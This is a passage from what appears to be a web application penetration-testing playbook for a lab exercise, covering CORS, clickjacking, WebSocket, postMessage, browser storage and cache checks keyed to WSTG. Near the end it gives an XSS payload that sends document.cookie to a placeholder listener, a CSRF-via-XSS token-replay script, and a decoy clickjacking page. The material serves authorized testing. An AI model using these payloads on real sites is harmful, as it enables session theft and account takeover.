> **Watch:** Only endpoints that return *executable* JS or JSONP (not plain JSON) are exploitable this way — plain `application/json` cannot be `<script src>`-included and executed, note it as not applicable instead.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed → finding, same root cause as a missing CORS check (block K); note both together. |

**If it fails →** cheatsheet: *Resource manipulation & XSSI templates*.

***

## K. CORS & RIA cross-domain policies

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;CORS credentialed-reflection test&nbsp;</span> · `WSTG-CLNT-07`

*When:* any API response (Phase 1 block I) sets `Access-Control-Allow-Origin`. Run once per API host.

```bash
curl -sk -i "<SCHEME>://<VHOST>/<API_PATH>" -H "Origin: <ORIGIN>" -H "Cookie: <COOKIE>" | grep -i "access-control"
```

> **Read:** `Access-Control-Allow-Origin: <ORIGIN>` (your attacker origin reflected back, not a fixed allow-list) combined with `Access-Control-Allow-Credentials: true` means any site can read this response while the victim is logged in — full session-data theft from a hosted page. `Access-Control-Allow-Origin: *` with credentials is invalid per spec and browsers reject it, but check anyway, some frameworks still send it.
> **Watch:** `null` is also a dangerous value — it is what a sandboxed iframe or a local file sends as its `Origin`, and some apps allow it by mistake.

| Save to file | Next |
|:---:|---|
| `[ ]` | Reflected + credentials → finding, build the one-line PoC (cheatsheet). Fixed allow-list, no credentials, or correctly rejected → not applicable, note and move on. |

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;RIA cross-domain policy permissiveness&nbsp;</span> · `WSTG-CONF-08`

*When:* Phase 1 block G found `crossdomain.xml` or `clientaccesspolicy.xml` with a `200`.

```bash
curl -sk "<SCHEME>://<VHOST>/crossdomain.xml" | grep -i "allow-access-from"
curl -sk "<SCHEME>://<VHOST>/clientaccesspolicy.xml" | grep -i "domain"
```

> **Read:** `domain="*"` (optionally with `secure="false"`) means any Flash/Silverlight content, anywhere, can make credentialed cross-domain requests to this app. Legacy, but still asked about and a two-second check once the file is already known to exist.

| Save to file | Next |
|:---:|---|
| `[ ]` | Wildcard found → finding. File absent or scoped to specific domains → not applicable. |

**If it fails →** cheatsheet: *CORS PoC page*, *RIA policy reference*.

***

## L. Clickjacking & reverse tabnabbing

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Framing headers&nbsp;</span> · `WSTG-CLNT-09`

Run once per distinct page template (login, a state-changing form, an admin action) — headers can differ per route.

```bash
curl -sk -i "<SCHEME>://<VHOST>/<URL>" | grep -iE "x-frame-options|content-security-policy"
```

> **Read:** No `X-Frame-Options` and no `frame-ancestors` in the CSP means the page can be framed. `X-Frame-Options: ALLOW-FROM ...` is itself a flag — it is deprecated and most modern browsers ignore it entirely, so check whether the app *actually* relies on it alone.

| Save to file | Next |
|:---:|---|
| `[ ]` | Unprotected and the page performs a state change (not just reads data) → build the PoC below. Protected → note and move on. |

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Clickjacking PoC&nbsp;</span> · `WSTG-CLNT-09`

```html
<style>iframe{opacity:0.0001;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2;} button{position:absolute;top:300px;left:400px;z-index:1;}</style>
<button>Click here to win a prize</button>
<iframe src="<SCHEME>://<VHOST>/<URL>"></iframe>
```

Serve it from the Stage 0 web server and open it in the browser proxied through Burp.

> **Read:** The overlay button sitting on top of the invisible iframe's real button/link is the whole PoC — a click lands on the target page, not the decoy.

| Save to file | Next |
|:---:|---|
| `[x]` (the HTML file) | Finding confirmed, keep the PoC file for the report. |

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;Reverse tabnabbing&nbsp;</span> · `WSTG-CLNT-14`

*When:* any page links out with `target="_blank"`.

```bash
grep -oE '<a [^>]*target="_blank"[^>]*>' /tmp/page.html
```

> **Read:** Missing `rel="noopener"` (and, for older engines, `noreferrer`) means the linked-to page can run `window.opener.location = "<phishing-page>"` and silently rewrite the original tab behind the user's back.

| Save to file | Next |
|:---:|---|
| `[ ]` | `rel` missing → finding. Present → not applicable. |

**If it fails →** cheatsheet: *Clickjacking PoC variants*, *Reverse tabnabbing PoC*.

***

## M. WebSockets & Web Messaging

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;WebSocket origin and content checks&nbsp;</span> · `WSTG-CLNT-10`

*When:* Burp's HTTP history shows a `101 Switching Protocols` / `ws://`/`wss://` upgrade.

```bash
curl -sk -i "<SCHEME>://<VHOST>/<WS_PATH>" -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Origin: <ORIGIN>" -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" -H "Sec-WebSocket-Version: 13"
```

> **Read:** A `101` response regardless of the attacker `<ORIGIN>` means the WebSocket handshake performs no origin check — any page, anywhere, can open an authenticated socket on the victim's behalf (cross-site WebSocket hijacking). Also use Burp's WebSocket history tab to resend captured messages with tampered fields and see if the server validates them server-side at all.
> **Watch:** `ws://` (no TLS) carrying session data is a finding by itself, independent of the origin check.

| Save to file | Next |
|:---:|---|
| `[ ]` | No origin check → finding. Tampered message accepted → note the specific field and effect. |

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;Web Messaging (postMessage) origin checks&nbsp;</span> · `WSTG-CLNT-11`

*When:* block G's grep found `addEventListener('message'` or `window.onmessage`.

```bash
grep -A5 "addEventListener(['\"]message" /tmp/page.html recon/js-*.js 2>/dev/null
```

> **Read:** Read the handler body. No `event.origin` check (or a check done with `.includes()`/`indexOf()` instead of an exact match / allow-list) means any framed page can send it a message. If the handler then writes `event.data` into `innerHTML` or `eval`s it, this is DOM XSS reachable from any origin — chain it with an `<iframe>` PoC (same page as block L) that calls `targetWindow.postMessage(payload, '*')`.

| Save to file | Next |
|:---:|---|
| `[ ]` | Weak/missing origin check + dangerous sink → finding, build the PoC. Proper exact-match check → not applicable. |

**If it fails →** cheatsheet: *WebSocket handshake variants*, *postMessage PoC template*.

***

## N. Browser storage & cache weaknesses

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Sensitive data in client storage&nbsp;</span> · `WSTG-CLNT-12`

Run once per target, after logging in. Browser DevTools, not curl — this is client-side state.

```text
DevTools → Application → Local Storage / Session Storage / IndexedDB / Cookies, for every origin shown.
Console: Object.entries(localStorage); Object.entries(sessionStorage); document.cookie
```

> **Read:** A JWT, a password, a full session object, or an API key sitting in `localStorage` is readable by *any* script on that origin — including an XSS payload found anywhere else on the same app, which turns a single DOM XSS into full account takeover. Note the key name and what it holds.
> **Watch:** A session cookie without `HttpOnly` is the same class of finding, cross-reference with Phase 5 (session handling) rather than duplicating the test there.

| Save to file | Next |
|:---:|---|
| `[ ]` | Sensitive value found in storage → finding, and raises the severity of any stored/DOM XSS found elsewhere on the same origin. |

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;Browser cache weaknesses&nbsp;</span> · `WSTG-CONF-12`

*When:* every authenticated or otherwise sensitive page, once.

```bash
curl -sk -i "<SCHEME>://<VHOST>/<SENSITIVE_URL>" -b "<COOKIE>" | grep -iE "cache-control|pragma|expires"
```

> **Read:** A page showing account data, tokens, or personal info with no `Cache-Control: no-store` (or only `no-cache`, which still permits disk caching after revalidation) can be replayed from local browser/disk cache after logout, or from a shared machine. Confirm in practice: log out, press the browser's back button, and check whether the sensitive content still renders without a fresh request.

| Save to file | Next |
|:---:|---|
| `[ ]` | Missing `no-store` on a sensitive page + content visible after logout via back button → finding. |

**If it fails →** cheatsheet: *Storage and cache inspection snippets*.

***

## O. Exploit chains & close out

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;Cookie theft demo&nbsp;</span> · `WSTG-INPV-01` / `02` · only when a question asks for impact

```html
<script>new Image().src='http://<LISTENER_IP>:<LISTENER_PORT>/?c='+encodeURIComponent(document.cookie)</script>
```

> **Read:** Deliver the confirmed payload (block D/F), watch the request land on your `nc`/http.server listener, read the cookie value from the query string. `HttpOnly` on the cookie makes this specific demo fail by design — note that instead and move to block N (storage) or a request forged with the victim's session (next step) as the real impact.

| Save to file | Next |
|:---:|---|
| `[ ]` | Captured value → submit as the answer if the question asks for it. |

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;CSRF-via-XSS (read a token, then act)&nbsp;</span> · only when a question asks for a privileged action

```html
<script>
fetch('<SCHEME>://<VHOST>/<FORM_URL>', {credentials:'include'})
  .then(r => r.text())
  .then(html => { const token = html.match(/name="csrf_token" value="([^"]+)"/)[1];
    fetch('<SCHEME>://<VHOST>/<ACTION_URL>', {method:'POST', credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'csrf_token='+token+'&<ACTION_PARAM>=<VALUE>'}); });
</script>
```

> **Read:** This is what turns a same-origin XSS into a full account-takeover chain: the victim's browser, not yours, reads the fresh anti-CSRF token and replays it. Confirm with a harmless action first (change a display name) before attempting anything destructive.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed → finding, with the full chain documented. |

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Completeness pass&nbsp;</span> · `MANUAL`

One pass per target, not one per finding.

- Every parameter, form field, header and cookie from the Phase 1 inventory was marked (block B).
- Every reflecting input has a recorded context (block C) — not just a "yes/no reflects".
- Every write surface was checked for persistence against a second role, not just a reload of the same page (block F).
- Every `.js` file from the Site map was grepped for sources and sinks (block G).
- CORS, clickjacking headers, and the RIA policy file (if one exists) were checked once per target (blocks K, L).
- `localStorage`/`sessionStorage`/cookies were inspected after logging in (block N).
- Each answer is submitted, and confirmed requests/responses are copied to the host PC, because a Kali reset erases everything.

***

## Question → where to look

| The question mentions | Run | WSTG |
|---|---|---|
| Reflected input, search box, URL parameter echoed | Marker sweep, context check, payload (B, C, D) | INPV-01 |
| Filter, blocked tags, WAF on XSS | Allow-list enumeration, encoding tricks (E) | INPV-01 |
| Comment, profile field, stored message, persists after reload | Stored XSS (F) | INPV-02 |
| `document.write`, `innerHTML`, `location.hash`, client-side only | DOM XSS (G) | CLNT-01 |
| `javascript:` link, execution without `<script>` | Non-script JS execution (H) | CLNT-02 |
| HTML injected but no script runs, defacement, fake form | HTML injection (H) | CLNT-03 |
| Open redirect, `redirect`/`next` parameter, external navigation | Client-side redirect (I) | CLNT-04 |
| CSS injection, attribute selector, style-based leak | CSS injection (I) | CLNT-05 |
| Attacker-controlled script/stylesheet/iframe source | Resource manipulation (J) | CLNT-06 |
| CORS, `Access-Control-Allow-Origin`, cross-origin data read | CORS test (K) | CLNT-07 |
| Frame, iframe, overlay, clickable element hijack | Framing headers, PoC (L) | CLNT-09 |
| WebSocket, `ws://`, real-time channel | WebSocket origin/content test (M) | CLNT-10 |
| `postMessage`, cross-window messaging | Web Messaging origin check (M) | CLNT-11 |
| `localStorage`, `sessionStorage`, token in browser storage | Client storage inspection (N) | CLNT-12 |
| JSONP, `<script src>` leaking data cross-origin | XSSI (J) | CLNT-13 |
| `target="_blank"`, `window.opener` | Reverse tabnabbing (L) | CLNT-14 |
| `crossdomain.xml`, `clientaccesspolicy.xml` | RIA policy check (K) | CONF-08 |
| Cache after logout, back button shows sensitive data | Browser cache weaknesses (N) | CONF-12 |
| Cookie theft, steal session, exfiltrate data | Exploit chain (O) | INPV-01/02 |
| CSRF token read then replayed via XSS | CSRF-via-XSS chain (O) | INPV-01/02 |

***

## Discovery → next step

| What you found | Do next |
|---|---|
| A parameter reflects the marker | Context check (C), then the matching payload (D) |
| Context known but payload blocked | Allow-list enumeration, encoding tricks (E) |
| Marker not reflected anywhere | Check it as a write surface instead (F) |
| A write surface accepts the marker | Reload every page/role that could render it (F) |
| `.js` file reachable from the page | Grep for sources and sinks (G) |
| Source reaches a sink with no check | Trigger it from the URL/hash in the browser (G) |
| Tags stripped but raw `<`/`>` survive | HTML injection impact (H) |
| A redirect/navigation parameter | Open-redirect payloads (I) |
| A `style` attribute or `<style>` block reflects input | CSS injection (I) |
| A theming/widget parameter sets a script/iframe `src` | Resource manipulation (J) |
| A JS/JSONP endpoint returns session data | XSSI PoC (J) |
| `Access-Control-Allow-Origin` header present | CORS credentialed test (K) |
| `crossdomain.xml`/`clientaccesspolicy.xml` from Phase 1 | RIA policy permissiveness (K) |
| No `X-Frame-Options`/`frame-ancestors` | Clickjacking PoC (L) |
| `target="_blank"` link without `rel="noopener"` | Reverse tabnabbing PoC (L) |
| `ws://`/`wss://` handshake in Burp history | Origin and message checks (M) |
| `addEventListener('message'` in page JS | postMessage origin check (M) |
| Sensitive value in `localStorage`/`sessionStorage` | Note it, raises severity of any XSS on the same origin (N) |
| Sensitive page with no `Cache-Control: no-store` | Back-button-after-logout test (N) |
| A question asks for an exact stolen value | Exploit chain with the listener (O) |

***

## Troubleshooting

| What happens | What to do |
|---|---|
| `alert(1)` never fires anywhere | Re-check the context probe (C) — the payload almost always mismatches the context, not the vulnerability being absent |
| Marker reflects but payload is stripped | Allow-list enumeration (E) before assuming it is unexploitable |
| Payload works in Repeater but not in the browser | Check the response `Content-Type` — a JSON/plain-text response never executes HTML even if it contains a payload |
| `innerHTML` payload with `<script>` does nothing | `innerHTML` never executes `<script>` tags by spec — use an event-handler payload instead (block D) |
| `location.hash` payload never shows in Burp | Expected — hash fragments are never sent to the server. Test and confirm in the browser URL bar directly |
| CORS test shows a fixed `Access-Control-Allow-Origin` value | Not exploitable as reflection — only a reflected/`*`+credentials combination is a finding |
| Clickjacking PoC iframe refuses to load | `X-Frame-Options: DENY/SAMEORIGIN` or `frame-ancestors` is active — note it as protected, not a finding |
| WebSocket handshake always rejects your Origin | Origin is validated — note it as protected and move to message-content tampering instead |
| Cookie theft demo captures nothing | Check `HttpOnly` on the cookie (expected failure), and that the listener/local server is reachable from the target's network, not just from Kali |
| Stored payload only ever reflects in your own session | Self-XSS — confirm a second role/account sees it before calling it a finding |
| Everything looks encoded everywhere | The app may be consistently safe for this input; move to the next parameter rather than forcing a finding |
| Kali reset | Re-create `/tmp/xss-poc` and restart the listener; confirmed requests/responses already copied to the host PC are unaffected |

***
